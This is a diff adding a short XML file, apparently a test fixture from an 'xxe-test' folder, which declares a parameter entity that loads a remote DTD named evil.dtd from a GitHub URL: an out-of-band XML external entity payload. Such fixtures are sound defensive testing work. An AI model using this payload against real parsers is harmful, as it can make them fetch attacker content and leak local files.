@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/Bruscan/FileToolWorks/main/xxe-test/evil.dtd">
+%dtd;
+]>
+<data>no entity reference in body</data>
